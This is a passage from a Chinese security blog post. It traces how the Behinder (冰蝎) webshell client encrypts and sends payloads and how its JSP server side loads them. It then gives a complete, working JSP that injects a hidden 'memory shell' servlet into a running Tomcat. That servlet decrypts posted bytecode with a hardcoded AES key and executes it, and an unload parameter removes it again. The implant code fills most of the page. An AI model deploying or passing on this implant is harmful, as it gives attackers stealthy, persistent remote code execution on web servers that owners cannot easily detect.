<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204349734.png" alt="image-20210104204349734"></p>
<p>​        uploadFile中获取加密的内容后的内容后保存data中，通过<code>Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);</code>发送data。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204640350.png" alt="image-20210104204640350"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204751479.png" alt="image-20210104204751479"></p>
<p>​        vip.youwe.sheller.utils.Utils#sendPostRequestBinary设置请求的地址，header，将传入的data发送到服务端。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204945951.png" alt="image-20210104204945951"></p>
<h4 id="接收请求"><a href="#接收请求" class="headerlink" title="接收请求"></a>接收请求</h4><p>​        获取返回内容，将返回内容保存到data属性中，并设置header和status属性到result中。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104205432759.png" alt="image-20210104205432759"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104205501589.png" alt="image-20210104205501589"></p>
<pre><code>requestAndParse中判断是否配置了额外追加的内容，如果没有则按原来的内容写入data属性并返回。</code></pre><p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105091901459.png" alt="image-20210105091901459"></p>
<p>​        回到uploadFile方法，将接收的内容转换为byte[],调用<code>Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType)</code>解密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092141005.png" alt="image-20210105092141005"></p>
<p>​        vip.youwe.sheller.core.Crypt#Decrypt中调用vip.youwe.sheller.core.Crypt#DecryptForJava解密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092342257.png" alt="image-20210105092342257"></p>
<p>​        使用AES算法解密，将解密的内容转换为字符串，最终通过base64解码获取到返回结果。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092444335.png" alt="image-20210105092444335"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092550558.png" alt="image-20210105092550558"></p>
<p>​        回到vip.youwe.sheller.ui.controller.FileManagerViewController#uploadFile中，获取status和msg的内容，根据status的内容判断是否上传成功。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092833304.png" alt="image-20210105092833304"></p>
<p>​        客户端的执行过程分析完毕，总结一下流程。</p>
<ul>
<li>获取需要上传的文件名和文件内容</li>
<li>通过ASM机制修改FileOperation字节码，修改其中的mode、path、content参数内容</li>
<li>将修改后的FileOperation字节码转换为byte[],并调用Crypt.Encrypt(bincls, key)对FileOperation字节码进行AES加密，并将加密的结果base64编码</li>
<li>将加密的内容以post的形式发送给服务端</li>
<li>接收响应内容，对响应的内容进行AES解密，再将解密后的内容进行base64解码。</li>
</ul>
<h3 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h3><p>​        再分析下服务端的代码实现，首先定义了一个类，类名为U这个类继承了ClassLoader，构造方法为调用父类的构造方法，方法g是调用父类的defineClass方法，defineClass方法可以将字节码转换为类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">	U(ClassLoader c)&#123;</span><br><span class="line">		<span class="keyword">super</span>(c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123; <span class="comment">//判断请求类型</span></span><br><span class="line">String k=<span class="string">"e45e329feb5d925b"</span>;</span><br><span class="line">session.putValue(<span class="string">"u"</span>,k); <span class="comment">//将key写入到session</span></span><br><span class="line">Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>)); <span class="comment">//初始化AES解码器</span></span><br><span class="line"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(</span><br><span class="line">c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())) <span class="comment">//将接收的内容base64解码后进行aes解密</span></span><br><span class="line">) <span class="comment">//创建ClassLoader对象，并调用ClassLoader.defineClass方法将接收的字节码转换为class类。</span></span><br><span class="line">    .newInstance().equals(pageContext);&#125;%&gt; <span class="comment">//创建该类对象并调用该对象的equals方法</span></span><br></pre></td></tr></table></figure>

<p>​            假如我客户端传入的是FileOperation的字节码，看下FileOperation类中equals方法的内容。在vip.youwe.sheller.payload.java.FileOperation#equals中，首先从传入的pageContext对象中获取到了session、request、response对象。因为我们之前传入的mode参数是create，所以会调用create(page)方法。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105100906831.png" alt="image-20210105100906831"></p>
<p>​        vip.youwe.sheller.payload.java.FileOperation#create中，通过path参数判断需要上传的文件路径，将content的内容base64解码后写入。并将返回的内容写入到msg参数中，</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101052540.png" alt="image-20210105101052540"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101213611.png" alt="image-20210105101213611"></p>
<p>​        从response对象中获取输出流，将result的内容加密后返回。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101308183.png" alt="image-20210105101308183"></p>
<p>​        vip.youwe.sheller.payload.java.FileOperation#Encrypt方法，从session中获取key，利用key将内容进行aes加密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101413988.png" alt="image-20210105101413988"></p>
<h2 id="冰蝎内存马实践"><a href="#冰蝎内存马实践" class="headerlink" title="冰蝎内存马实践"></a>冰蝎内存马实践</h2><p>​        通过上面的分析，只要在注入的内存马中实现服务端的功能即可，服务端功能如下：</p>
<ul>
<li>获取defineClass对象并调用defineClass将接收的内容转换为class类。</li>
<li>将key写入到session</li>
<li>将接收的内容进行base64解码后进行AES解密</li>
<li>创建传入的class类的对象，并调用对象的equals方法，在调用的同时传入pageContext对象。</li>
</ul>
<p>代码和原服务端的代码改动不大</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardService"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.mapper.Mapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.concurrent.ConcurrentHashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.Wrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardWrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ContainerBase"</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.GeneralSecurityException"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.NoSuchAlgorithmException"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"javax.crypto.Cipher"</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.InvalidKeyException"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.NoSuchAlgorithmException"</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        <span class="keyword">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">TomcatServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String value=req.getParameter(<span class="string">"sectest666"</span>);</span><br><span class="line">        <span class="keyword">if</span>(value!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value.equals(<span class="string">"unload"</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    ServletContext servletContext = req.getServletContext();</span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    Field contextField = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardContext standardContext = (StandardContext) contextField.get(applicationContext);</span><br><span class="line">                    Field serviceF = <span class="keyword">null</span>;</span><br><span class="line">                    serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                    serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                    Mapper mapper = service.getMapper();</span><br><span class="line">                    Field contextObjectToContextVersionMapF = <span class="keyword">null</span>;</span><br><span class="line">                    contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                    contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                    Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                    Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                    Method removeWrapper = <span class="keyword">null</span>;</span><br><span class="line">                    removeWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"removeWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                    removeWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    removeWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String k = <span class="string">"e45e329feb5d925b"</span>;</span><br><span class="line">        HttpSession session = req.getSession();</span><br><span class="line">        session.setAttribute(<span class="string">"u"</span>, k);</span><br><span class="line">        Cipher c = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c = Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchPaddingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(k.getBytes(), <span class="string">"AES"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeyException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(<span class="keyword">this</span>, req, resp, <span class="keyword">null</span>, <span class="keyword">true</span>, <span class="number">8192</span>, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(</span><br><span class="line">                    c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BadPaddingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                    Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                    serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                    Mapper mapper = service.getMapper();</span><br><span class="line">                    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                    contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>);</span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); </span><br><span class="line">                        StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();</span><br><span class="line">                        Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">                        instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        instanceF.set(wrappershell,tomcatServlet);</span><br><span class="line">                        wrappershell.setServletClass(<span class="string">"TomcatServlet"</span>);</span><br><span class="line">                        Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">                        parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        parent.set(wrappershell, standardContext);</span><br><span class="line">                        wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br><span class="line">                        Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                        Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                        Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                        addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">                        out.println(<span class="string">"Servlet has been Inject,please visit /test666 to access shell and visit /test666?sectest666=unload to unload shell!!!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​        效果如下：</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133641319.png" alt="image-20210105133641319"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133705533.png" alt="image-20210105133705533"></p>
<p>​        访问unload接口删除内存马</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133718522.png" alt></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133734706.png" alt="image-20210105133734706"></p>
<p>​        </p>
<h4 id><a href="#" class="headerlink" title></a></h4>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
